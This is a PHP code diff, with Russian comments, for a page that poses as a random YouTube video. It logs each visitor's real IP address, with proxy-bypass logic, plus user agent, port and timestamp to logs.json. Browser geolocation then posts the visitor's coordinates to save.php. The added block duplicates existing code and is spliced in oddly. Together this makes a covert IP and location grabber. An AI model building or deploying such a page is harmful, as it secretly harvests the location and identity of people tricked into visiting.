@@ -53,6 +53,67 @@ $current_data[$log_entry['id']] = $log_entry;
 file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
 ?>
 <!DOCTYPE html>
+<?php
+// index.php
+session_start();
+
+// Установка временной зоны Узбекистана (Ташкент) для точной фиксации кликов
+date_default_timezone_set('Asia/Tashkent');
+
+// Функция продвинутого определения реального IP пользователя в обход прокси-серверов
+function getRealIP() {
+    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+    foreach ($ip_keys as $key) {
+        if (!empty($_SERVER[$key])) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip);
+                // Валидация публичного IP-адреса
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+            // Если публичный IP не найден, но передан валидный локальный IP
+            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
+                return $_SERVER[$key];
+            }
+        }
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
+}
+
+$ip = getRealIP();
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
+$request_time = date('Y-m-d H:i:s'); // Время фиксируется по Ташкенту
+$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
+$port = $_SERVER['REMOTE_PORT'] ?? '';
+
+// Массив тестовых ID видео для автоматической генерации случайного ролика
+$videos = ['dQw4w9WgXcQ', 'jNQXAC9IVRw', '9bZkp7q19f0'];
+$random_video = $videos[array_rand($videos)];
+
+// Структура записи для хранения в базе данных логов
+$log_entry = [
+    'id' => uniqid(),
+    'time' => $request_time,
+    'ip' => $ip,
+    'user_agent' => $user_agent,
+    'protocol' => $protocol,
+    'port' => $port,
+    'lat' => 'Доступ отклонен или ожидается',
+    'lon' => 'Доступ отклонен или ожидается'
+];
+
+// Сохраняем ID текущей сессии для связки с AJAX-обработчиком координат
+$_SESSION['current_log_id'] = $log_entry['id'];
+
+// Запись первичных данных в файл logs.json
+$file = 'logs.json';
+$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
+if (!is_array($current_data)) $current_data = [];
+$current_data[$log_entry['id']] = $log_entry;
+file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
+?>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -97,6 +158,7 @@ if (navigator.geolocation) {
         data.append('lat', position.coords.latitude);
         data.append('lon', position.coords.longitude);
 
+        // Отправка полученных координат в save.php
         fetch('save.php', {
             method: 'POST',
             body: data
